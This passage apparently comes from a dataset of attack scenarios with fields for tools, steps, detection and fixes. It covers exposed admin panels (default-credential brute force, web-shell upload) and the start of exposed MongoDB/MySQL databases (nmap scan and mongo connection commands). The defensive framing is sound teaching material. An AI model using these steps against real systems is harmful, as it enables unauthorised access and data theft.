Solution: Patch RDP vulnerabilities; restrict port 3389 access; use RDP Gateway or VPN access only
Tags: RDP Exploit, BlueKeep, Brute Force, Windows Attack

Title: Exposed Admin Panels
Scenario Description: Attackers find and access web admin panels left open (e.g., /admin, /phpmyadmin, /config) to gain system control via weak auth or RCE flaws.
Tools Used: Dirsearch, Burp Suite, Nikto, Hydra, FFUF
Attack Steps: Step 1: Attacker scans the website or IP using tools like dirsearch or ffuf to brute-force common admin panel paths (e.g., /admin, /admin/login, /cpanel).Step 2: Once found, attempts login using default credentials (e.g., admin:admin, admin:password) or brute-force with hydra or Burp Intruder.Step 3: If panel is protected by weak authentication or reused credentials, attacker gains access.Step 4: Some admin panels (like phpMyAdmin, CMS admin panels, outdated CPanel) allow command execution or file upload — attacker uploads PHP shell or modifies config.Step 5: If the panel allows plugin/theme uploads (e.g., WordPress, Joomla), attacker injects web shell or malicious script.Step 6: Attacker now has backdoor access and may exfiltrate data, create new users, or pivot into deeper systems.Step 7: Defender can detect this by monitoring for panel access from untrusted IPs and unusual user agents.Step 8: Audit logs inside admin portals often show access attempts and changes.Step 9: Secure admin panels using firewalls, VPN-only access, CAPTCHA, and strong passwords.Step 10: Never leave unused admin interfaces exposed to the public; restrict by IP or hostname if possible.
Vulnerability: Public admin panels, default creds, weak ACL
Impact: Admin control, file access, full system breach
Detection Method: Monitor panel logins, brute force attempts, unusual request paths
Solution: Use VPN to access panels; enforce MFA; rename default panel URLs; apply brute-force protection
Tags: Admin Panel Exploit, Web RCE, CMS Abuse

Title: Exposed Databases (MongoDB, MySQL)
Scenario Description: Database ports like 27017 (MongoDB) or 3306 (MySQL) are left open to the public without authentication or firewall rules.
Tools Used: Nmap, Mongo CLI, MySQL CLI, Shodan, Metasploit
Attack Steps: Step 1: Use shodan.io or run nmap -p 27017,3306 --open <target-range> to find publicly exposed MongoDB or MySQL ports.Step 2: For MongoDB, connect using: mongo --host <target-ip> --port 27017.
